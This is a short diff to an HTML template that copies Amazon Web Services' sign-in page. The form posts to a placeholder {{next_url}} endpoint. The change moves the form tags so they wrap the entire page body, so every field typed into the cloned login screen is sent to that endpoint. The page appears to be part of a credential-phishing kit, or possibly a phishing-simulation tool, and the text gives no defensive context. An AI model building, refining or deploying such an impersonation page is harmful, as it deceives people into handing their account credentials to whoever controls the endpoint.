@@ -199,6 +199,7 @@ to{transform:rotate(360deg)}
 <meta name="savepage-comments" content="">
   </head>
 <body class="awsui aws-signin-ui" style="margin-top: 30px; margin-right:40px; margin-bottom:20px; margin-left:40px;">
+					      <form role="form" action="{{next_url}}" method="POST">
 <div id="signin-main-box" class="aws-signin-main-box fixed-width">
     <div id="logo_container" class="aws-signin-logo-header-box">
         <h1 id="logo_head" class="background-left">
@@ -252,7 +253,7 @@ to{transform:rotate(360deg)}
                                         <span>instead.</span>
                                     </span>
                     </div>
-					      <form role="form" action="{{ next_url }}" method="POST">
+
 
                     <div class="aws-signin-general-input-box">
                         <input id="resolving_input" class="aws-signin-textfield" autocorrect="off" autocapitalize="off" type="text" value="">
@@ -264,7 +265,7 @@ to{transform:rotate(360deg)}
                     <div class="aws-signin-general-button-box">
                         <input id="next_button" type="submit" value="Submit" class="aws-signin-button aws-signin-button-size-normal aws-signin-button-variant-primary aws-signin-button-width-full"><span id="next_button_text" class="aws-signin-color-white">Next</span></input>
                     </div>
-      </form>
+
                     <!-- New Account -->
                     <div id="new_account_container" class="aws-signin-new-account-box">
                         <div class="signin-break-wrapper">
@@ -878,4 +879,5 @@ to{transform:rotate(360deg)}
 </div>
 <div id="modal_background_div" class="awsui-modal-__state-hidden awsui-modal-overlay">
 </div>
+      </form>
 </body></html>
